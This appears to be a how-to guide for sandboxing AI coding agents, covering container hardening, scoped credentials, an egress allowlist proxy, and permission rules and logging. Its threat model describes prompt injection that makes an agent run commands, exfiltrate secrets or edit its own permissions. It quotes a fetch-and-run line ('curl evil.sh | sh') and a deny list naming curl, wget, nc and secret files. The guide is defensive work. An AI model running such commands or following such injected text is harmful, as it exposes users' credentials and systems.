# Sandboxing a Frontier AI Coding Agent

## The Turnkey Guide: Zero to a Reusable Dev Sandbox

**Who this is for:** anyone who wants to hand a repository to an AI coding agent (Claude Code, Cursor agents, Aider, OpenHands) without also handing it their SSH keys, their cloud credentials, their home directory, and their unrestricted internet connection.

**What you end up with:** a directory you can commit to git, containing a locked-down container, a default-deny egress proxy you build yourself, and a `sandbox` command that takes you from a repo URL to a running agent in three lines. Your agent settings, standing instructions, and custom commands live in a version-controlled `profile/` directory and are reapplied automatically every time the container is regenerated — because it *will* be regenerated, constantly, on purpose.

**Time:** about 20 minutes the first time, and about 20 seconds per session after that.

**Companion scaffold:** everything described here exists as working files in `agent-sandbox/`. You can read the guide top to bottom, or run the quickstart and read afterwards.

---

## 0. The 60-second version

```bash
cd agent-sandbox

./sandbox init git@github.com:you/project.git   # clone, allowlist the host, write .env
./sandbox login                                 # log in once — or paste a key into .env
./sandbox new fix-login                         # fresh clone on branch agent/fix-login
./sandbox verify                                # prove the walls exist before trusting them
./sandbox go                                    # the agent starts, inside the box

# ... it works, you watch, it finishes, you exit ...

./sandbox review                                # diff + untracked files + secret scan, on the host
./sandbox push                                  # push from YOUR environment, not the agent's
./sandbox pr                                    # ...or push and open the PR/MR in one step
./sandbox destroy                               # containers and workspace gone; revoke the tokens
```

That is the whole daily loop. The rest of this document explains what each of those commands is actually protecting you from, and how to change it when your project needs something different.

**If something goes wrong**, `./sandbox doctor` diagnoses and repairs the state that actually breaks in practice, and Part 13 documents each real failure with its real cause — which, in every case in that list, was not the obvious one.

**Non-standard SSH port?** Use the `ssh://` form. `git@host:2222/group/repo.git` does not mean port 2222; git's scp-style syntax has no port field, so that reads as port 22 and a path beginning `2222/`. Part 13 has the details.

---

## 1. Why bother

An agent reads files, writes files, runs shell commands, installs packages, and makes network requests. That combination is the product — and it is also the entire threat surface.

- A hallucinated path plus a `rm -rf` is your repo, or your home directory.
- A **prompt injection** — hidden instructions in a README, an issue comment, a webpage, a dependency's docs — can make the agent run commands you never asked for, with your credentials.
- A malicious `postinstall` script in a package the agent installs reads `.env`, `~/.ssh/id_ed25519`, `~/.aws/credentials`, and posts them somewhere.
- A loop that doesn't terminate fills your disk or forks until the machine stops responding.

Sandboxing is not a statement about how much you trust the model. It is a statement about how much a mistake should cost. The goal is to make errors and injections **cheap and reversible**: contained to a container you were going to delete anyway, on a branch you were going to review anyway, with credentials that expire tomorrow anyway.

### Threat model

| # | Threat | Concretely | Stopped by |
|---|---|---|---|
| 1 | Destructive filesystem operations | Agent deletes or rewrites files outside the task | Part 4 — throwaway clone + single bind mount + read-only rootfs |
| 2 | Credential theft | Agent or a package reads `~/.ssh`, `.env`, cloud creds | Part 5 — nothing sensitive is ever mounted |
| 3 | Exfiltration | Stolen data leaves via `curl`, `git push`, DNS, a package's telemetry | Part 6 — default-deny egress allowlist |
| 4 | Prompt injection | Fetched content says "run this script" | Parts 6 + 7 — no route out, plus tool-level permission gates |
| 5 | Resource exhaustion | Fork bomb, infinite loop, disk fill | Part 8 — cgroup limits and a wall-clock kill switch |
| 6 | Persistence | Agent writes a cron job, an rc file, a git hook that survives | Part 4 — read-only rootfs, tmpfs home, `--rm` container |
| 7 | Lateral movement | Agent uses discovered creds to reach prod | Parts 5 + 6 — no creds, no route |
| 8 | Silent tampering | Something changes and you never notice | Part 9 — proxy access log and command log written *outside* the container |
| 9 | Escape lands somewhere privileged | Container escape, or a pasted command, in an account that can `sudo` | Part 2 — a dedicated account with no sudo, and rootless Podman |

### The four rules everything else implements

1. **The agent works in a throwaway clone on a throwaway branch.** Never your main checkout.
2. **The container is destroyed every session.** Nothing it writes outside the worktree survives.
3. **Credentials are short-lived, single-purpose, and revoked afterwards.** Treat them like CI secrets, not like your personal login.
4. **Review, test, and push happen in your environment, outside the box.**

---

## 2. Prerequisites

You need Linux, macOS, or Windows with WSL2; git; and a container runtime.

**git** — `git --version`. If this is a fresh machine, set your identity:

```bash
git config --global user.name "Your Name"
git config --global user.email "you@example.com"
```

**A user account that cannot become root.** This is the prerequisite people skip, and it quietly voids most of what follows. The container is the wall; but an escape — or a command you paste because the agent suggested it — lands in whatever account launched the sandbox. If that account can `sudo`, the blast radius is the machine, and every layer below was theatre.

The worst case is the default case. AWS, Azure and GCE images all ship their first user (`ubuntu`, `ec2-user`, `azureuser`) with `NOPASSWD:ALL` in `/etc/sudoers.d/` — root with no password, no prompt, no friction. That is the account you are handed when the VM boots.

So: one admin account for installing packages, and a separate unprivileged account that runs the agent.

```bash
sudo adduser --disabled-password --gecos "" sandboxer
sudo -l -U sandboxer                                        # want "not allowed to run sudo"
groups sandboxer                                            # want no sudo/wheel/admin/docker
sudo grep -rn NOPASSWD /etc/sudoers /etc/sudoers.d/         # want sandboxer absent
```

The `grep` matters most and is the one that gets skipped: a blanket rule in `/etc/sudoers.d/90-cloud-init-users` can hand passwordless sudo to a *group*, which a new user may already be in. Membership of `docker` counts too — it is equivalent to root on the host.

`./sandbox` warns when the account running it can reach root, and `./sandbox doctor` reports it as a line item. `SANDBOX_ALLOW_PRIVILEGED=1` silences that if you have weighed it and decided otherwise; it is your machine.

**Rootless Podman — the default, and the right one on Linux.** No root daemon, so a container escape lands in your unprivileged account rather than on the host as root. On Debian/Ubuntu:

```bash
sudo apt install -y podman podman-compose uidmap slirp4netns fuse-overlayfs dbus-user-session
sudo loginctl enable-linger sandboxer
grep "^sandboxer:" /etc/subuid /etc/subgid      # must print two lines
```

Part 12 and `docs/11-podman.md` cover the two things that differ under Podman; the scaffold handles both.

**Docker** works too — set `SANDBOX_RUNTIME=docker` in `.env`. Docker Desktop on macOS/Windows (enable the WSL2 backend on Windows). On Linux, follow the packaged apt/dnf instructions at docs.docker.com rather than piping a script into a root shell — a guide about not running untrusted code should not open by asking you to run untrusted code. Be aware that membership of the `docker` group is equivalent to root on the host, which is most of why Podman is the default here.

**Optional but recommended:** `gitleaks` (secret scanning during review) and `jq` (used by the seccomp generator and by the command-logging hook).

Everything else — the images, the proxy, the config — is built from the scaffold.

---

## 3. Layout

```
agent-sandbox/
├── sandbox                  # the CLI: init, new, go, verify, review, push, destroy
├── docker-compose.yml       # two services: agent (locked down), egress-proxy (the gate)
├── .env                     # your short-lived secrets — chmod 600, never committed
│
├── agent/
│   ├── Dockerfile           # the agent's world
│   └── entrypoint.sh        # rebuilds $HOME from profile/ on every start
│
├── proxy/
│   ├── Dockerfile           # stock Alpine + Squid, no third-party image
│   ├── squid.conf           # default-deny allowlist
│   ├── allowlist.txt        # GENERATED: what squid reads — vendor block + base
│   ├── allowlist.base.txt   # your policy: hosts allowed whichever agent runs
│   ├── never-allow.txt      # upload sinks and over-wide domains `allow` refuses
│   └── agents/              # per-vendor endpoint blocks (claude.txt, codex.txt)
│
├── profile/                 # ★ your defaults, version-controlled, mounted read-only
│   ├── claude/settings.json #   permission rules + hooks
│   ├── claude/CLAUDE.md     #   standing instructions
│   ├── bin/qa               #   custom commands on PATH
│   ├── shellrc.sh           #   aliases, prompt
│   └── setup.sh             #   per-session bootstrap
│
├── scripts/
│   ├── verify.sh            # self-test: are the walls actually there?
│   └── make-seccomp.sh      # optional Layer 4
│
├── project/                 # the canonical clone — NEVER mounted
├── workspace/               # a clone of project/ — the ONE host dir the agent sees
├── logs/                    # audit trail, written from inside, readable outside
├── auth/                    # saved agent login, if you use one — chmod 700
└── secrets/                 # deploy key, if you use one — mounted read-only
```

The split between `project/` and `workspace/` is load-bearing. `project/` is a normal clone that lives only on your host; `workspace/` is a clone *of it*, on its own branch, and is the only thing bind-mounted into the container. A `git reset --hard` or a deleted file in `workspace/` cannot touch `project/`, and the agent's output arrives as a clean, reviewable branch rather than as edits to your working tree.

### Why `workspace/` is a clone and not a `git worktree`

The natural choice is `git worktree add` — same repository, second checkout, one shared object store. This guide used to say exactly that, and it is wrong for anything that crosses a container boundary.

A linked worktree's `.git` is not a directory. It is a *file* holding an absolute host path:

```
gitdir: /home/you/agent-sandbox/project/.git/worktrees/workspace
```

Objects, refs and the worktree's own admin directory all live under `project/.git` — which is deliberately never mounted into the container. So the agent's very first git command fails:

```
fatal: not a git repository: .../project/.git/worktrees/workspace
```

Mounting `project/` makes the error go away and takes the isolation with it: the container would then hold write access to the canonical clone's object store and refs, which is the one thing this layout exists to prevent.

The split state is fragile on the host too. Delete `workspace/` by hand and the registration survives (`missing but already registered worktree`); re-clone `project/` and the reverse happens (`not a git repository`); a half-failed `worktree add -b` leaves its branch behind so the retry dies with `a branch named 'agent/x' already exists`. `git worktree prune` fixes exactly one of those three, which is why it feels like the errors are chasing each other.

A clone is self-contained. It works inside the container, `rm -rf workspace` is a complete uninstall, `--no-hardlinks` keeps the object stores physically separate, and `./sandbox new` repoints `origin` at the real upstream so `./sandbox push` reaches your server rather than a directory on your disk. The cost is one extra copy of the objects. Pay it.

---

## 4. Layer 1 — the container

> **Defends:** destructive filesystem operations, persistence.

### The image

Everything the agent will ever run is installed at build time, because the root filesystem is read-only at runtime.

```dockerfile
FROM node:22-bookworm-slim

ARG HOST_UID=1000
ARG HOST_GID=1000
ARG AGENT_CLI="@anthropic-ai/claude-code"

RUN apt-get update && apt-get install -y --no-install-recommends \
      ca-certificates curl file git jq less make nano netcat-openbsd \
      openssh-client patch procps python-is-python3 python3 python3-pip \
      python3-venv ripgrep shellcheck tini tree unzip xz-utils \
 && rm -rf /var/lib/apt/lists/*

# `ext::` remotes let git run an arbitrary command as the transport.
RUN git config --system protocol.ext.allow never

# The node image ships a stock `node` user on uid 1000. Remove it so the agent
# user can take YOUR uid — otherwise every file the agent writes into the
# mounted workspace comes back owned by the wrong user.
RUN userdel -r node 2>/dev/null || true; \
    groupadd -g "${HOST_GID}" agent 2>/dev/null || true; \
    useradd -m -u "${HOST_UID}" -g "${HOST_GID}" -s /bin/bash agent

RUN npm install -g ${AGENT_CLI}

COPY entrypoint.sh /usr/local/bin/agent-entrypoint
RUN chmod 0755 /usr/local/bin/agent-entrypoint

WORKDIR /workspace/repo
USER agent
ENTRYPOINT ["/usr/bin/tini", "--", "/usr/local/bin/agent-entrypoint"]
CMD ["claude"]
```

Three details that are easy to get wrong:

**The uid dance.** If the container user's uid doesn't match yours, every file the agent creates in the bind-mounted workspace comes back owned by someone else, and you get permission errors the moment you try to review or commit — plus the subtler one where a `0600` deploy key is visible but unreadable.

`./sandbox` resolves this **at run time**, from `id -u` / `id -g` of whoever is executing it, exports them for compose interpolation, and rewrites `.env` if the stored values disagree. Freezing them at `init` time — the original design — quietly breaks the moment the bundle is copied to another machine, another account, or a host whose uid is not 1000, and it breaks with errors that never mention uids. Because the agent user is created from those build args, a changed uid invalidates the image layer cache by itself and the next run rebuilds. Nothing to remember.

**The base image is `node:22-bookworm-slim`, not a distro image.** The CLI requires Node ≥ 22 and distro packages lag: Ubuntu 24.04 ships 18.19, and installing on it emits `npm WARN EBADENGINE` — a *warning*, so the build succeeds and the CLI then misbehaves at runtime. The alternative, piping NodeSource's installer into a root shell, is precisely what Part 2 tells you not to do. A pinned upstream image avoids both, and the build ends with `node --version` so a wrong version fails the build rather than shipping.

**`tini` as PID 1.** Agents spawn a lot of subprocesses. Without an init that reaps them, a long session accumulates zombies until it hits the pid limit and mysteriously stops being able to run commands.

**The CLI is installed as root into `/usr/local`.** The agent runs as `agent` and the filesystem is read-only, so it cannot modify or replace its own binary — which matters, because a compromised agent that can rewrite its own harness can rewrite its own permission checks.

To use a different agent: `./sandbox agent codex` (or `claude`) handles the built-in pair — it sets `AGENT_CLI`/`AGENT_BIN` in `.env`, swaps the vendor block of the egress allowlist and asks for the rebuild. For anything else, change `AGENT_CLI` in `.env` (for npm-based CLIs) or swap the `npm install -g` line for `pip install aider-chat` and adjust `CMD`.

### The runtime flags

From `docker-compose.yml`:

```yaml
  agent:
    user: "${HOST_UID:-1000}:${HOST_GID:-1000}"
    read_only: true
    tmpfs:
      - /tmp:mode=1777,size=1g
      - /home/agent:mode=0777,size=1g          # no uid=/gid=: Podman rejects them
    volumes:
      - ./workspace:/workspace/repo        # the ONE folder of yours it sees
      - ./profile:/opt/profile:ro          # defaults it can read, never edit
      - ./logs:/logs                       # audit trail, written outside
      - ./secrets:/run/secrets:ro          # deploy key, if you use one
      - ./auth:/run/auth:ro                # saved agent login; rw only for ./sandbox login
    cap_drop: [ALL]
    security_opt: ["no-new-privileges:true"]
    pids_limit: 512
    mem_limit: ${AGENT_MEMORY:-4g}
    cpus: ${AGENT_CPUS:-2}
    networks: [egress]                     # internal — no route to the internet
```

| Setting | What it buys you |
|---|---|
| `user: <your uid>` | Non-root. An exploit inherits an unprivileged account, and file ownership stays sane. |
| `read_only: true` | `/`, `/usr`, `/etc` are immutable. No installed backdoor, no edited rc file, no modified agent binary. |
| `tmpfs` for `/tmp` and `$HOME` | RAM-backed scratch that vanishes on exit. Also why the profile has to be re-materialised each start — see Part 7. |
| `cap_drop: [ALL]` | No raw sockets, no mounting, no `ptrace` of other processes. |
| `no-new-privileges` | A setuid binary cannot escalate, even if one sneaks into the image. |
| `pids_limit` / `mem_limit` / `cpus` | Fork bombs and runaway builds hit a ceiling instead of your laptop. |
| One bind mount | Everything not mounted is not merely forbidden — it does not exist in that mount namespace. |

**No `uid=`/`gid=` on the tmpfs mounts.** Docker accepts them, so it is tempting to hand `$HOME` to the agent uid directly; Podman's `--tmpfs` parser takes only a subset of options and refuses, with `unknown mount option "uid=1000": invalid mount option`. Without an owner the tmpfs belongs to root, so the mode has to let the agent write instead — `0777` on a per-container tmpfs that serves one user and is destroyed on exit costs nothing.

**Never mount `~/.ssh`, `~/.aws`, `~/.config/gh`, `~/.kube`, or your home directory.** Not read-only, not "just this once." Unmounted is a stronger guarantee than any permission rule, because it is enforced by the kernel rather than by a config file the agent can read.

### Prove it

```bash
./sandbox verify
```

This runs `scripts/verify.sh` inside the real container and checks each claim above: non-root, empty effective capability set, `/etc` unwritable, `/tmp` writable, worktree mounted, no SSH keys reachable, no direct internet route, allowlisted host reachable, blocked host refused, profile materialised, cgroup limits set. It prints a pass/fail line per check.

Run it after any change to the compose file. A sandbox you haven't tested is a sandbox you're assuming.

---

## 5. Layer 2 — credentials

> **Defends:** credential theft, lateral movement.

The best-protected secret is one that was never in the container. Work down this list in order and stop at the first option that covers your workflow.

### Option A — no credentials at all (start here)

The agent writes code and commits. **You** push, from the host:

```bash
./sandbox review     # read the diff, run the secret scan
./sandbox push       # uses your normal git credentials, outside the sandbox
```

The container gets an `ANTHROPIC_API_KEY` and nothing else. There is no repo token to steal because there is no repo token. For the overwhelming majority of work, this is the right answer, and it's the default the scaffold ships with.

### Option B — a scoped HTTPS token

If the agent genuinely needs to push (long autonomous runs, opening its own PRs):

**GitHub** — Settings → Developer settings → **Fine-grained** tokens. Select **one repository**. Permissions: Contents `read/write`, and Pull requests `read/write` only if it should open PRs. Expiration: **1 day**. Paste into `.env` as `GIT_TOKEN` and set `SANDBOX_FORWARD_GIT_TOKEN=1` beside it — the compose file does not forward the token just because it is filled in.

**GitLab** — the project's Settings → Access tokens. Role `Developer`, scope `write_repository`, expiry tomorrow. Same variable.

Inside the container:

```bash
git push "https://x-access-token:${GIT_TOKEN}@github.com/you/project.git" HEAD
# GitLab:
git push "https://oauth2:${GIT_TOKEN}@gitlab.com/you/project.git" HEAD
```

Classic PATs are not an acceptable substitute here. A classic PAT with `repo` scope grants access to *every* repository you can see — one leak and the blast radius is your entire account.

### Option C — an SSH deploy key

Per-repository, no account-wide reach, and revocable from the repo's own settings.

```bash
ssh-keygen -t ed25519 -C "agent-sandbox" -f secrets/deploy_key -N ""
chmod 600 secrets/deploy_key
cat secrets/deploy_key.pub    # add to GitHub repo → Settings → Deploy keys (tick "Allow write access")
                              # or GitLab project → Settings → Repository → Deploy keys
```

There is a wrinkle worth understanding. The sandbox has no direct network route — everything goes through an HTTP proxy — and an HTTP proxy cannot carry SSH on port 22. Both GitHub and GitLab publish an SSH endpoint on port 443 for exactly this situation, and the entrypoint wires it up automatically when it finds a mounted key:

```
Host github.com
  HostName ssh.github.com
  Port 443
  User git
  IdentityFile ~/.ssh/id_ed25519
  ProxyCommand nc -X connect -x egress-proxy:3128 %h %p
```

`gitlab.com` gets the same treatment via `altssh.gitlab.com`. Both hostnames are covered by the default allowlist. The generated config uses `StrictHostKeyChecking accept-new` — trust-on-first-use. If you want to eliminate that window, pin the host keys into `profile/` and copy them to `~/.ssh/known_hosts` in the entrypoint.

**Self-hosted, on a non-standard SSH port?** Two edits. Set `GIT_SSH_HOST` and `GIT_SSH_PORT` in `.env`, so the entrypoint writes a matching `Host` block; and add that port to the `SSH_ports` ACL in `proxy/squid.conf`, because Squid refuses `CONNECT` to any port not listed. Every port you open there is another way out — if you push from the host with `./sandbox push`, skip all of it.

**The key has to be readable by the container's uid.** A `0600` file is readable by its owning uid and nobody else, and the container runs as `HOST_UID` from `.env`. Generate the key with `sudo`, copy it from another machine, or write `.env` under a different account, and you get a mount that exists but cannot be opened:

```
install: cannot open '/run/secrets/deploy_key' for reading: Permission denied
```

The fix is `sudo chown "$(id -u):$(id -g)" secrets/deploy_key && chmod 600 secrets/deploy_key` — or correcting `HOST_UID` if *that* is the stale side. `./sandbox go` now warns about both before starting, and the entrypoint prints the fix rather than dying on it.

### The model API key

Create a **separate** key with its own spend limit, not the one your other projects use. An agent in a retry loop is the classic way to discover what your monthly budget looks like when it's gone. Anthropic Console → API keys → new key, scoped to a workspace with a limit you'd be annoyed but not ruined by.

### Staying logged in across sessions

The disposable container has an obvious side effect: `$HOME` is a tmpfs, so an interactive login dies with the session and the agent asks you to authenticate every single time. That friction is exactly the kind that leads to people turning the sandbox off, so it is worth solving properly.

Three options, in increasing order of how much you are trusting the host:

**An API key.** `ANTHROPIC_API_KEY` in `.env`. No login flow, and a spend limit you chose. The right answer for anything unattended.

**A saved OAuth session.** Log in once, keep it:

```bash
./sandbox login     # run /login inside, finish in the browser, exit
./sandbox go        # and every run after — no prompt
./sandbox logout    # delete it
```

`auth/` is bind-mounted **read-only** at `/run/auth`. The entrypoint copies the session (`.credentials.json`) and the account/onboarding state (`.claude.json`, without which the CLI redoes first-run setup) into the tmpfs `$HOME` at start. Only `./sandbox login` layers `docker-compose.login.yml` on top, remounting `auth/` read-write and setting `SANDBOX_PERSIST_AUTH=1` so the entrypoint writes back at exit — a normal session can read your saved login but never modify it, because the mount itself refuses the write.

Be honest about what this costs. That file is a live login to your Claude account — broader than a scoped API key — and it now lives on disk and is mounted into a container running model-directed code. So: `auth/` is `chmod 700` and gitignored; `settings.json` denies `Read(//run/auth/**)`; `./sandbox destroy` reminds you it is still there. Use an API key for unattended runs, and `./sandbox logout` plus a session revoke in your account settings when you are done on a shared machine.

**A long-lived token.** If your CLI version offers one — check `claude setup-token` — put it in `.env` as `CLAUDE_CODE_OAUTH_TOKEN`; the compose file passes it through. Same caveats as the saved session.

### Rotation is part of the workflow

`./sandbox destroy` ends by printing exactly which credentials you just used and where to revoke them. Do it. A one-day token you forget to revoke is a one-day token; a one-day token you *renew out of habit* is a permanent credential wearing a disguise.

---

## 6. Layer 3 — egress

> **Defends:** exfiltration, prompt injection, lateral movement.

This is the highest-leverage control in the entire guide. If stolen secrets cannot leave, they are not stolen. If `curl evil.sh | sh` cannot resolve, the injection is inert.

### How it works

Two networks. The agent sits on `egress`, which is declared `internal: true` — Docker gives it **no default route**. Not a firewall rule, not a policy: there is simply no path to the internet in its routing table.

```yaml
networks:
  egress:
    internal: true      # no route out, at all
  internet: {}          # only the proxy is attached to this
```

The proxy is attached to both. It is the only door, and it is a door with a list.

```
agent ──► egress (internal) ──► egress-proxy ──► internet ──► allowlisted hosts only
```

### Build the proxy yourself

The original version of this guide told you to run `your-org/tinyproxy-allowlist`, an image that does not exist. Here is a real one, built from Alpine's packaged Squid — nothing to trust beyond Alpine's package signing.

`proxy/Dockerfile`:

```dockerfile
FROM alpine:3.20
RUN apk add --no-cache squid \
 && mkdir -p /var/cache/squid /var/log/squid /var/run/squid \
 && chown -R squid:squid /var/cache/squid /var/log/squid /var/run/squid
COPY squid.conf /etc/squid/squid.conf
COPY allowlist.txt /etc/squid/allowlist.txt
EXPOSE 3128
USER squid                     # ← start unprivileged; see below
CMD ["squid", "-N", "-d", "1", "-f", "/etc/squid/squid.conf"]
```

**That `USER squid` line is not a nicety.** Squid's documented startup is: run as root, read the config, `setuid()` to `cache_effective_user`, then open the log targets. Under Docker, `/dev/stdout` and `/dev/stderr` belong to the identity the container *started* with. So a root→squid drop leaves squid unable to open its own log, and it dies on every start:

```
ERROR: Cannot open cache_log (/dev/stderr) for writing;
    fopen(3) error: (13) Permission denied
FATAL: Cannot open '/dev/stdout' for writing.
The parent directory must be writeable by the user 'squid', which is the
cache_effective_user set in squid.conf.
```

`restart: unless-stopped` then loops it, the healthcheck never passes, and the *agent* is what appears to fail:

```
Container agent-egress-proxy Error dependency egress-proxy failed to start
dependency failed to start: container agent-egress-proxy is unhealthy
```

Granting capabilities does not help — `CHOWN`, `SETUID`, `SETGID` and `DAC_OVERRIDE` are all cleared by the kernel the instant `setuid()` lands on a non-zero uid, which is before the logs are opened. The fix is to have no privilege drop at all: start as `squid` in the Dockerfile, add `user: "squid:squid"` to the compose service, delete the `cap_add` list, and give squid a pid file it can write (`pid_filename /var/cache/squid/squid.pid`), since `/var/run` is no longer writable.

`proxy/squid.conf`, in full:

```
http_port 3128
visible_hostname agent-egress-proxy

# No-ops now that the container starts as squid — kept for anyone running
# this image as root elsewhere.
cache_effective_user squid
cache_effective_group squid

# Running unprivileged, squid cannot write the default /var/run/squid.pid.
pid_filename /var/cache/squid/squid.pid

acl SSL_ports port 443
acl Safe_ports port 80
acl Safe_ports port 443
acl CONNECT method CONNECT
acl allowed_domains dstdomain "/etc/squid/allowlist.txt"

http_access deny !Safe_ports
http_access deny CONNECT !SSL_ports
http_access allow allowed_domains
http_access deny all          # ← the important line

cache deny all
cache_mem 0 MB

logfile_rotate 0
access_log stdio:/dev/stdout squid
cache_log /dev/stderr

forwarded_for delete
via off
httpd_suppress_version_string on
connect_timeout 15 seconds
```

Rules are evaluated in order and the first match wins, so `http_access deny all` at the end is the default and everything above it is a carve-out.

For HTTPS the agent issues `CONNECT api.anthropic.com:443` and Squid matches on that hostname. **There is no TLS interception**, which means no CA certificate to install in the container, no plaintext copy of the agent's traffic sitting on disk, and no new way for the proxy itself to become a liability. The tradeoff is that you control *who* the agent talks to, not *what* it says — see Part 14.

### The allowlist is your policy file

`proxy/allowlist.txt` — one host per line, a leading dot matching the domain and its subdomains. Since the per-agent split it is **generated**: the active agent's vendor block (`proxy/agents/<name>.txt`) plus everything agent-independent (`proxy/allowlist.base.txt`, where your own entries live and survive an agent swap):

```
api.anthropic.com
.github.com              # github.com, api.github.com, codeload, ssh.github.com
.githubusercontent.com
.gitlab.com              # gitlab.com and altssh.gitlab.com
.npmjs.org
pypi.org
files.pythonhosted.org
```

That is the minimum for an API-key setup. **If you authenticate the CLI interactively** (`./sandbox login`) or let it update itself, it also needs the hosts behind the login and release flows:

```
claude.ai
claude.com
code.claude.com
platform.claude.com
downloads.claude.ai
bridge.claudeusercontent.com
mcp-proxy.anthropic.com
```

Two notes on that block. `storage.googleapis.com`, where the CLI's release artifacts live, is *not* on it: the profile sets `DISABLE_AUTOUPDATER=1` and `./sandbox upgrade` rebuilds the image on the host, so nothing inside needs the bucket — and it is a *shared* bucket host, anyone can create a bucket under it and PUT to a signed URL, which makes it a pure exfiltration channel once the updater is off. It comes back only if you re-enable self-update. And the whole block is unnecessary on an API-key-only setup — delete it, because every line is a destination data could leave through. The scaffold ships it enabled with the reasoning inline, so removing it is a two-second edit rather than an archaeology exercise.

`formulae.brew.sh` appears in Anthropic's published list for Homebrew installs; the agent image here is Ubuntu-based and does not use brew, so it ships commented out.

Adding a host is one command, and it reloads Squid in place:

```bash
./sandbox allow docs.internal.example.com --reason 'the API docs the tests quote'
```

The reason is not optional: it is written above the entry as `# added by ./sandbox allow: <reason>`, so the list keeps explaining itself. The argument has to be a plain hostname — a URL, a port or an IP address is refused with a hint — and anything on `proxy/never-allow.txt` is refused outright. That file is short: multi-tenant upload sinks (`storage.googleapis.com`, `transfer.sh`, `.ngrok.io`, Discord webhooks) and parent domains far wider than any project needs (`amazonaws.com` bare), each with a one-line reason. A hostname alone says nothing about who owns the bucket or the paste on the other end, so allowing one is allowing everyone. `./sandbox reload` and `./sandbox doctor` run the same check over the source files, so a hand edit that adds one gets a warning.

Keep this list short and boring. Every entry is a channel data could leave through. `.github.com` is already a generous one — see Part 14 for what that implies.

### Watch it work

```bash
./sandbox logs proxy
```

Every request, allowed and denied, with its verdict. `TCP_DENIED/403` is the sound of the sandbox doing its job. This log lives on the host, outside the container, so nothing inside can retroactively edit it.

### Why not just use iptables?

The original guide offered a host firewall as a "simpler alternative":

```bash
iptables -A OUTPUT -d api.anthropic.com -p tcp --dport 443 -j ACCEPT   # ← don't
```

This resolves `api.anthropic.com` to a **single IP address at the moment you type the command** and pins that IP forever. The Anthropic API, GitHub, and npm all sit behind CDNs with rotating address pools, so the rule silently stops matching — sometimes within minutes. You end up with a firewall that appears to be enforcing a policy while actually blocking legitimate traffic and, worse, permitting whatever else has since been assigned that IP.

Default-deny on the host with `iptables -P OUTPUT DROP` is still a reasonable *outer* layer if you want belt and braces. But hostname-based allowlisting belongs at the proxy, where hostnames are re-resolved per request and per connection. Use the proxy.

The genuinely stronger option is architectural: run the sandbox in a cloud VPC subnet with **no NAT gateway and no internet route**, reaching only VPC endpoints for the specific services you need. Nothing to misconfigure, and the policy is auditable in your infrastructure code.

---

## 7. Layer 4 — the profile: defaults that survive regeneration

> **Defends:** you, from re-configuring this every single session.

Here is the tension. The container has to be disposable — that is the whole security model. But a disposable container means a disposable `~/.claude/settings.json`, disposable standing instructions, disposable aliases, disposable everything. Reconfiguring by hand each session is exactly the kind of friction that leads to people quietly turning the sandbox off.

The fix is to keep the configuration **outside** the container, in a directory you version-control, and rebuild the container's home directory from it at every start.

### How it works

`profile/` is bind-mounted **read-only** at `/opt/profile`. The entrypoint runs before the agent and copies it into the tmpfs `$HOME`:

```bash
# agent/entrypoint.sh (abridged)
install -d -m 0700 "$HOME/.claude" "$HOME/.ssh" "$HOME/.local/bin"

cp -a "$PROFILE_DIR/claude/."  "$HOME/.claude/"          # settings.json, CLAUDE.md
cp -a "$PROFILE_DIR/bin/."     "$HOME/.local/bin/"       # custom commands on PATH
cp    "$PROFILE_DIR/shellrc.sh" "$HOME/.bashrc"          # aliases, prompt

git config --global user.name  "${GIT_AUTHOR_NAME:-agent}"
git config --global user.email "${GIT_AUTHOR_EMAIL:-agent@sandbox.local}"
git config --global --add safe.directory /workspace/repo

[ -f /run/secrets/deploy_key ] && setup_ssh_over_443       # Part 5
[ -x "$PROFILE_DIR/setup.sh" ] && "$PROFILE_DIR/setup.sh"  # npm ci, venv, …

exec "$@"
```

| Profile file | Materialises as | Purpose |
|---|---|---|
| `claude/settings.json` | `~/.claude/settings.json` | Permission allow / ask / deny lists, hooks, env |
| `claude/CLAUDE.md` | `~/.claude/CLAUDE.md` | Standing instructions the agent reads every session |
| `bin/*` | `~/.local/bin/*` | Custom commands on `PATH` — `qa`, deploy scripts, whatever |
| `shellrc.sh` | `~/.bashrc` | Aliases, a prompt that reminds you where you are |
| `setup.sh` | *runs at start* | Per-session bootstrap: `npm ci`, virtualenv, codegen |

**Read-only is not incidental.** The agent operates under these rules but cannot rewrite them. A prompt injection that says "add `Bash(curl:*)` to your allow list" fails at the filesystem layer, not at the model's discretion. This is the difference between a permission system and a suggestion.

### `profile/claude/settings.json`

The permission gate is the layer that catches what OS isolation can't: an action that is *technically permitted* inside the sandbox but isn't what you asked for.

```json
{
  "permissions": {
    "defaultMode": "acceptEdits",
    "allow": [
      "Bash(git status:*)", "Bash(git diff:*)", "Bash(git commit:*)",
      "Bash(npm run test:*)", "Bash(pytest:*)", "Bash(qa:*)",
      "Read(//workspace/repo/**)", "Edit(//workspace/repo/**)"
    ],
    "ask": [
      "Bash(git push:*)", "Bash(git reset:*)",
      "Bash(npm install:*)", "Bash(npm i:*)", "Bash(npx:*)",
      "Bash(pip install:*)", "Bash(python3 -m pip:*)",
      "WebFetch", "WebSearch"
    ],
    "deny": [
      "Bash(sudo:*)", "Bash(curl:*)", "Bash(wget:*)", "Bash(nc:*)",
      "Bash(git push --force:*)",
      "Edit(//workspace/repo/.git/**)", "Edit(//workspace/repo/.claude/**)",
      "Edit(//workspace/repo/.mcp.json)", "Edit(//workspace/repo/.envrc)",
      "Read(//run/secrets/**)", "Read(//run/auth/**)", "Read(//home/agent/.ssh/**)",
      "Read(./.env)", "Read(**/id_ed25519*)", "Read(**/*.pem)"
    ]
  },
  "enableAllProjectMcpServers": false,
  "hooks": {
    "PreToolUse": [{
      "matcher": "Bash",
      "hooks": [{
        "type": "command",
        "command": "jq -r '\"[\\(now|todate)] \\(.tool_input.command)\"' >> /logs/commands.log"
      }]
    }]
  }
}
```

Three things to note:

**`defaultMode: "acceptEdits"`** lets the agent edit files in the worktree without asking each time. That is safe *here* specifically because the worktree is disposable and every change is reviewed as a diff before it goes anywhere. Outside a sandbox this setting would be reckless; inside one it is what makes the sandbox worth using.

**Paths use `//` for absolute.** `Read(//run/secrets/**)` is the absolute path `/run/secrets/`; `Read(./.env)` is relative to the project directory. Getting this wrong produces a rule that silently matches nothing.

**The `PreToolUse` hook** appends every Bash command the agent runs to `/logs/commands.log` — a bind mount, so it lands on your host. Hooks are executed by the harness, not by the model, so this is a record the agent cannot decline to write and cannot go back and edit. `./sandbox logs commands` tails it live.

